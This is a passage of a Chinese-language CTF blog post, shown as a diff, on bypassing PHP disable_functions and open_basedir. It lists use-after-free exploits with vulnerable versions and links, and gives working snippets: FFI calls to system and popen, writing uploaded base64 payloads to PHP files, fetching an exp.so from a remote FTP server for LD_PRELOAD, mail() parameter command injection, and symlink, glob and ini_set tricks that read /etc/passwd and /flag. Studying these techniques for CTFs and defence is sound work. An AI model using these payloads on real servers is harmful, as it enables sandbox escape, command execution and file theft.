+<li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
+<li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
+</ul>
+<p>exp: <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php</a></p>
+<h2 id="利用-Backtrace-UAF"><a href="#利用-Backtrace-UAF" class="headerlink" title="利用 Backtrace UAF"></a>利用 Backtrace UAF</h2><p>该漏洞利用在debug_backtrace()函数中使用了两年的一个 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76047">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞</p>
+<ul>
+<li>Linux 操作系统</li>
+<li>PHP7.0 - all versions to date</li>
+<li>PHP7.1 - all versions to date</li>
+<li>PHP7.2 - all versions to date</li>
+<li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li>
+<li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li>
+</ul>
+<p>exp: <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
+<h2 id="利用-concat-operation-UAF"><a href="#利用-concat-operation-UAF" class="headerlink" title="利用 concat operation UAF"></a>利用 concat operation UAF</h2><p>此漏洞利用处理字符串连接的函数中的<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81705">bug</a>。如果 <code>$a.$b</code> 满足某些条件，则可能导致内存损坏的语句。错误报告提供了对漏洞的非常彻底的分析。</p>
+<ul>
+<li>7.3 - all versions to date</li>
+<li>7.4 - all versions to date</li>
+<li>8.0 - all versions to date</li>
+<li>8.1 - all versions to date</li>
+</ul>
+<p>所有 PHP7 版本中都存在根本问题。但是，较旧的 （&lt;7.3） 版本存在另一个错误，该错误会阻止在代码的某些部分正确释放内存，包括 <code>concat_function</code> 。此漏洞严重依赖该功能才能正常工作，因此在某种程度上，memleak 阻止了内存损坏漏洞的可利用性</p>
+<p>exp: <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-concat-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-concat-bypass/exploit.php</a></p>
+<h2 id="利用-user-filter"><a href="#利用-user-filter" class="headerlink" title="利用 user_filter"></a>利用 user_filter</h2><p>此漏洞利用了 10 多年前报告的<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=54350">bug</a></p>
+<ul>
+<li>5.* - exploitable with minor changes to the PoC</li>
+<li>7.0 - all versions to date</li>
+<li>7.1 - all versions to date</li>
+<li>7.2 - all versions to date</li>
+<li>7.3 - all versions to date</li>
+<li>7.4 &lt; 7.4.26</li>
+<li>8.0 &lt; 8.0.13</li>
+</ul>
+<p>exp: <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</a></p>
+<h2 id="利用SplDoublyLinkedList-UAF"><a href="#利用SplDoublyLinkedList-UAF" class="headerlink" title="利用SplDoublyLinkedList UAF"></a>利用SplDoublyLinkedList UAF</h2><p>PHP的SplDoublyLinkedList双向链表库中存在一个UAF漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等。</p>
+<ul>
+<li>PHP v7.4.10及其之前版本</li>
+<li>PHP v8.0（Alpha）</li>
+</ul>
+<p>例题：BMZCTF2020 - ezphp</p>
+<p>exp: <a target="_blank" rel="noopener" href="https://github.com/cfreal/exploits/blob/master/php-SplDoublyLinkedList-offsetUnset/exploit.php">https://github.com/cfreal/exploits/blob/master/php-SplDoublyLinkedList-offsetUnset/exploit.php</a></p>
+<h2 id="利用FFI扩展"><a href="#利用FFI扩展" class="headerlink" title="利用FFI扩展"></a>利用FFI扩展</h2><p>PHP FFI（Foreign Function interface），提供了高级语言直接的互相调用，而对于PHP而言，FFI让我们可以方便的调用C语言写的各种库。</p>
+<ul>
+<li>PHP &gt;&#x3D; 7.4</li>
+<li>开启了 FFI 扩展且<code>ffi.enable=true﻿</code></li>
+</ul>
+<p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions</p>
+<div class="code-wrapper"><pre><code class="hljs clean">$ffi = FFI::cdef(<span class="hljs-string">&quot;int system(char* command);&quot;</span>);   # 声明C语言中的<span class="hljs-keyword">system</span>函数
+$ffi -&gt; <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);   # 执行ls /命令并将结果写入/tmp/res.txt</code></pre></div>
+
+<p>C库的system函数调用shell命令，只能获取到shell命令的返回值，而不能获取shell命令的输出结果，如果想获取输出结果我们可以用popen函数来实现。popen()函数会调用fork()产生子进程，然后从子进程中调用 &#x2F;bin&#x2F;sh -c 来执行参数 command 的指令。</p>
+<p>popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针使用C库的fgetc等函数来读取子进程的输出设备或是写入到子进程的标准输入设备中。</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);
+<span class="hljs-variable">$o</span> = <span class="hljs-variable">$ffi</span>-&gt;popen(<span class="hljs-string">&quot;ls /&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);
+<span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">while</span>((<span class="hljs-variable">$c</span> = <span class="hljs-variable">$ffi</span>-&gt;fgetc(<span class="hljs-variable">$o</span>)) != -1)&#123;
+    <span class="hljs-variable">$d</span> .= str_pad(strval(dechex(<span class="hljs-variable">$c</span>)),2,<span class="hljs-string">&quot;0&quot;</span>,0);
+&#125;
+<span class="hljs-variable">$ffi</span>-&gt;pclose(<span class="hljs-variable">$o</span>);
+<span class="hljs-built_in">echo</span> hex2bin(<span class="hljs-variable">$d</span>);</code></pre></div>
+
+<p>还可以利用FFI调用php源码，比如php_exec()函数就是php源码中的一个函数，当他参数type为3时对应着调用的是passthru()函数，其执行命令可以直接将结果原始输出</p>
+<div class="code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ffi</span> = <span class="hljs-title class_">FFI</span>::cdef(<span class="hljs-string">&quot;int php_exec(int type, char *cmd);&quot;</span>);
+<span class="hljs-variable">$ffi</span> -&gt; php_exec(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;ls /&quot;</span>);</code></pre></div>
+
+<h1 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h1><h4 id="蚁剑直接传"><a href="#蚁剑直接传" class="headerlink" title="蚁剑直接传"></a>蚁剑直接传</h4><p>要求fputs,fwrite函数不被禁用</p>
+<h4 id="使用文件操作函数"><a href="#使用文件操作函数" class="headerlink" title="使用文件操作函数"></a>使用文件操作函数</h4><p>如使用base64配合fopen, fputs, fwrite, file_put_contents</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(<span class="hljs-string">&quot;a.php&quot;</span>,<span class="hljs-params">base64_decode</span>($<span class="hljs-params">_POST</span>[&#x27;<span class="hljs-params">a</span>&#x27;])</span>)</code></pre></div>
+
+<p>原生类SplFileObject</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;http://网址/文件&quot;</span>);</code></pre></div>
+
+<p>或base64编码后的结果</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=http://网址/文件&quot;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;</code></pre></div>
+
+<p>copy函数</p>
+<div class="code-wrapper"><pre><code class="hljs applescript"><span class="hljs-keyword">copy</span>(<span class="hljs-string">&quot;http://网址/文件&quot;</span>, <span class="hljs-string">&quot;文件保存路径&quot;</span>);</code></pre></div>
+
+<p>move_uploaded_file函数，POST上传文件即可</p>
+<div class="code-wrapper"><pre><code class="hljs prolog">move_uploaded_file($<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], $<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);</code></pre></div>
+
+<h4 id="FTP上传"><a href="#FTP上传" class="headerlink" title="FTP上传  **"></a>FTP上传  **</h4><p>server</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer
+<span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> FTPHandler
+<span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServer
+
+
+authorizer = DummyAuthorizer()
+
+authorizer.add_anonymous(&quot;./&quot;)
+
+<span class="hljs-keyword">handler</span> = FTPHandler
+<span class="hljs-keyword">handler</span>.authorizer = authorizer
+
+<span class="hljs-keyword">handler</span>.masquerade_address = &quot;ip&quot;
+# 注意要用被动模式
+<span class="hljs-keyword">handler</span>.passive_ports = range(<span class="hljs-number">9998</span>,<span class="hljs-number">10000</span>)
+
+<span class="hljs-keyword">server</span> = FTPServer((&quot;0.0.0.0&quot;, <span class="hljs-number">23</span>), <span class="hljs-keyword">handler</span>)
+<span class="hljs-keyword">server</span>.serve_forever()</code></pre></div>
+
+<p>client</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$local_file</span> = <span class="hljs-string">&#x27;/tmp/exp.so&#x27;</span>;
+<span class="hljs-variable">$server_file</span> = <span class="hljs-string">&#x27;exp.so&#x27;</span>;
+<span class="hljs-variable">$ftp_server</span> = <span class="hljs-string">&#x27;xxxxx&#x27;</span>;
+<span class="hljs-variable">$ftp_port</span>=<span class="hljs-number">23</span>;
+
+<span class="hljs-variable">$ftp</span> = <span class="hljs-title function_ invoke__">ftp_connect</span>(<span class="hljs-variable">$ftp_server</span>,<span class="hljs-variable">$ftp_port</span>);
+
+<span class="hljs-variable">$login_result</span> = <span class="hljs-title function_ invoke__">ftp_login</span>(<span class="hljs-variable">$ftp</span>, <span class="hljs-string">&#x27;anonymous&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);
+
+<span class="hljs-title function_ invoke__">ftp_pasv</span>(<span class="hljs-variable">$ftp</span>,<span class="hljs-number">1</span>);
+
+<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ftp_get</span>(<span class="hljs-variable">$ftp</span>, <span class="hljs-variable">$local_file</span>, <span class="hljs-variable">$server_file</span>, FTP_BINARY)) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Successfully written to <span class="hljs-subst">$local_file</span>\n&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There was a problem\n&quot;</span>;
+&#125;
+
+<span class="hljs-title function_ invoke__">ftp_close</span>(<span class="hljs-variable">$ftp</span>);
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h4 id="使用XML相关类写文件"><a href="#使用XML相关类写文件" class="headerlink" title="使用XML相关类写文件"></a>使用XML相关类写文件</h4><p>SimpleXMLElement</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">$xml = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SimpleXMLElement([<span class="hljs-params">xml</span>-<span class="hljs-params">data</span>])</span>;
+$xml-&gt;<span class="hljs-keyword">as</span><span class="hljs-constructor">XML([<span class="hljs-params">filename</span>])</span>;</code></pre></div>
+
+<p>DOMDocument</p>
+<div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-symbol">$d</span>=<span class="hljs-keyword">new</span> DOMDocument();
+<span class="hljs-symbol">$d</span>-&gt;loadHTML(<span class="hljs-string">&quot;[base64-data]&quot;</span>);
+<span class="hljs-symbol">$d</span>-&gt;saveHtmlFile(<span class="hljs-string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=[filename]&quot;</span>)</code></pre></div>
+
+<h4 id="文件上传临时文件"><a href="#文件上传临时文件" class="headerlink" title="文件上传临时文件  ***"></a>文件上传临时文件  ***</h4><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中，在上传存储到临时目录后，<strong>临时文件命名的规则如下</strong>: 默认为 php+4或者6位随机数字和大小写字母 <code>php[0-9A-Za-z]&#123;3,4,5,6&#125;</code>，上传完成则删除</p>
+<p>这里可以使用用<strong>glob伪协议</strong>去锁定临时文件</p>
+<div class="code-wrapper"><pre><code class="hljs awk">var_dump(scandir(<span class="hljs-string">&#x27;/tmp&#x27;</span>));
+<span class="hljs-variable">$a</span>=scandir(<span class="hljs-string">&quot;glob:///tmp/php*&quot;</span>);
+<span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/tmp/&quot;</span>.<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>];
+var_dump(<span class="hljs-variable">$filename</span>);
+
+<span class="hljs-regexp">//</span>putenv(<span class="hljs-string">&quot;LD_PRELOAD=$filename&quot;</span>);
+<span class="hljs-regexp">//m</span>b_send_mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);</code></pre></div>
+
+<p>如果向我们的一句话木马POST的话，当然也可以使用以下代码来获取临时文件名</p>
+<div class="code-wrapper"><pre><code class="hljs prolog">$<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]</code></pre></div>
+
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>如果第五个参数没有经过php_escape_shell_cmd处理，</p>
+<p>可以使用mail(“”,””,””,””, ‘ -a ;ls &#x2F; &gt; &#x2F;tmp&#x2F;t.txt’);来进行命令执行，</p>
+<p>如下</p>
+<div class="code-wrapper"><pre><code class="hljs">#include &lt;stdio.h&gt;
+
+int main() &#123;
+    FILE *sendmail;
+    int ret;
+    char buf[128];
+    
+    sendmail = popen(&quot;/usr/sbin/sendmail -t -i -a;ls / &gt; /tmp/ttt&quot;, &quot;w&quot;);
+    fprintf(sendmail, &quot;2&quot;);
+    while(fgets(buf, sizeof buf, sendmail)) &#123;
+        printf(&quot;%s&quot;, buf);
+    &#125;
+    ret = pclose(sendmail);
+</code></pre></div>
+<p>​		<br>​		printf(“%d”, ret);<br>​		return 0;<br>​	}</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LANG=zh_CN.GBK&quot;</span>);
+<span class="hljs-comment">//ini_set(&#x27;mail.force_extra_parameters&#x27;,&#x27; -a;echo 1 &gt; /tmp/t&#x27;);</span>
+<span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27; -a &#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0xbf</span>).<span class="hljs-string">&#x27;;ls / &gt; /tmp/t.txt&#x27;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+<p>网上搜了一下，大概考点应该是disable_function绕过，网上给的脚本大多是先通过蚁剑连接再上传so文件进行绕过。但是查看了一下网站根目录，发现一个<code>.antproxy.php</code>,问了hurrison说是反制蚁剑连接的。</p>
 <p>也就是说没办法蚁剑连接。查看权限，发现只有<code>/var/www/html</code> 是0755权限没有写文件权限，而其他路径都是0的权限，这道题势必要getshell执行系统命令才行了。</p>
 <p>所以思路就是想办法上传文件，<strong>利用 LD_PRELOAD 环境变量</strong>来执行系统命令。</p>
 <ul>
@@ -302,6 +959,70 @@
 <p>能够控制LD_PRELOAD环境变量的值，比如putenv()函数</p>
 <p>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</p>
 </blockquote>
+<h1 id="openbase-dir-（设置的是前缀）"><a href="#openbase-dir-（设置的是前缀）" class="headerlink" title="openbase_dir  （设置的是前缀）"></a>openbase_dir  （设置的是前缀）</h1><p>open_basedir 是php.ini 中的 一个配置选项。可以用作与 将用户访问文件的活动范围限制在指定的区域 ， 假设 open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp&#x2F; ， 那么通过 web 1 访问服务器的用户 就无法获取服务器上除了 &#x2F;var&#x2F;www&#x2F;html&#x2F;web1 和 &#x2F;tmp 这两个目录 以外 的文件。</p>
+<p>注意： open_basedir 指定的限制实际上是前缀 而不是 目录名,</p>
+<p>举个例子， 若“open_basedir” &#x3D; &#x2F;dir&#x2F;user 那么目录 &#x2F;dir&#x2F;user 和 &#x2F;dir&#x2F;user1 都是可以访问的。。</p>
+<p>所以，如果要访问限制在仅为指定的目录，请用斜线结束路径名。例如 设置成：“open_basedir”</p>
+<p>&#x3D;&#x2F;dir&#x2F;user&#x2F;</p>
+<h1 id="bypass-openbase-dir"><a href="#bypass-openbase-dir" class="headerlink" title="bypass openbase_dir"></a>bypass openbase_dir</h1><h2 id="symlink-（软链接）"><a href="#symlink-（软链接）" class="headerlink" title="symlink()     （软链接）"></a>symlink()     （软链接）</h2><div class="code-wrapper"><pre><code class="hljs perl">&lt;?php
+<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;a&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;a&quot;</span>);
+<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;b&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;b&quot;</span>);
+<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;c&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;c&quot;</span>);
+<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;d&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;d&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);
+<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);
+<span class="hljs-keyword">symlink</span>(<span class="hljs-string">&quot;a/b/c/d&quot;</span>,<span class="hljs-string">&quot;qwe&quot;</span>);
+<span class="hljs-keyword">symlink</span>(<span class="hljs-string">&quot;qwe/../../../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>);
+<span class="hljs-keyword">unlink</span>(<span class="hljs-string">&quot;qwe&quot;</span>);
+<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;qwe&quot;</span>);
+?&gt;</code></pre></div>
+
+<p>然后访问<code>127.0.0.1/exp</code>即可</p>
+<p>创建一个链接文件qwe，用小队路径指向A&#x2F;B&#x2F;C&#x2F;D，再创建一个链接文件exp 指向 qwe&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd。 其实指向的就是A&#x2F;B&#x2F;C&#x2F;D&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，其实就是&#x2F;etc&#x2F;passwd. 这时候删除qwe再创一个qwe目录，但exp还是指向qwe&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，所以就成功跨到&#x2F;etc&#x2F;passwd了。</p>
+<h2 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob:&#x2F;&#x2F;"></a>DirectoryIterator+glob:&#x2F;&#x2F;</h2><p>DirectoryIterator是php的内置类，配合glob:&#x2F;&#x2F;能无视open_basedir的限制，读取根目录</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);
+<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot;\n&quot;</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>但缺点是它们都只能列出根目录下和open_basedir指定的目录下的文件</p>
+<h2 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir() + readdir()+glob:&#x2F;&#x2F;"></a>opendir() + readdir()+glob:&#x2F;&#x2F;</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];
+<span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>) ) &#123;
+    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
+    &#125;
+    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>与上面一样都只能列出根目录下和open_basedir指定的目录下的文件</p>
+<h2 id="chdir-ini-set"><a href="#chdir-ini-set" class="headerlink" title="chdir() + ini_set()"></a>chdir() + ini_set()</h2><p>你只能在<code>open_basedir()</code>所限制的范围中选择更详细的范围来设置</p>
+<p>但这时就出现一个问题，任何一个目录下都有<code>.</code> 和<code>..</code>这两个目录，通过 <code>ini_set(&#39;open_basedir&#39;, &#39;..&#39;)</code> 的设置，就可以全区允许访问 <code>..</code> 这个目录</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这种情况下通常disable_function只禁用了命令执行的函数，并且给出了eval（）</p>
+<div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-built_in">highlight_file</span>(__FILE__);
+
+<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]);</code></pre></div>
+
+<p><img src="/../images/disable-function/image-20231102163700318.png" srcset="/img/loading.gif" lazyload alt="image-20231102163700318"></p>
+<p>首先肯定是有多种方法的，我们这里讲bypass open_basedir</p>
+<p><img src="/../images/disable-function/image-20231102163759470.png" srcset="/img/loading.gif" lazyload alt="image-20231102163759470"></p>
+<div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">mkdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">print_r</span>(scandir(&#x27;.&#x27;));</code></pre></div>
+
+<p>要设置<code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;)</code>才能访问<code>/</code>目录下的文件</p>
+<div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">mkdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;/&#x27;);<span class="hljs-built_in">readfile</span>(&#x27;/flag&#x27;);</code></pre></div>
+
+
+
 
                 
               </div>
